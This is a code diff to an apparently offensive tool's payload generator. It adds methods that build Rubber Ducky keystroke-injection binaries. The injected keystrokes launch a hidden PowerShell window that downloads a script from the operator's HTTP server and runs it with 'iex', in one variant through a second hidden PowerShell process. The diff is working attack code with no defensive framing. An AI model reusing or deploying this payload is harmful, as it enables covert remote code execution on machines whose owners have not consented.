@@ -215,9 +215,23 @@ class Generator:
         f.close()
         c.close()
     
-    def encode_duckyscript(self):
+    def encode_duckyscript_script(self):
         print(f"{n} encoding inject.bin . . .")
         ducky = f"""GUI r\nDELAY 500\nSTRING powershell -w h -c "$a=(new-object system.net.webclient).downloadstring('http://{self.settings.http_server_address[0]}:{str(self.settings.http_server_address[1])}/{self.settings.script_name}'); start powershell -arg '-c', \\"iex `\\"$a`\\"\\" -wi hidden"\nENTER"""
+        with open("core/payload/ducky/script.txt", "w") as f:
+            f.write(ducky)
+        f.close()
+        command = ["java", "-jar", "./core/payload/ducky/encoder.jar", "-i", "./core/payload/ducky/script.txt", "-o", "inject.bin"]
+        subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if not os.path.exists('inject.bin'):
+            print(f"{e} failed to create inject.bin")
+            return
+        print(f"{i} inject.bin created")
+        os.remove("core/payload/ducky/script.txt")
+
+    def encode_duckyscript_shell(self):
+        print(f"{n} encoding inject.bin . . .")
+        ducky = f"""GUI r\nDELAY 500\nSTRING powershell -w h -c "iex(new-object system.net.webclient).downloadstring('http://{self.settings.http_server_address[0]}:{str(self.settings.http_server_address[1])}/{self.settings.script_name}')"\nENTER"""
         with open("core/payload/ducky/script.txt", "w") as f:
             f.write(ducky)
         f.close()
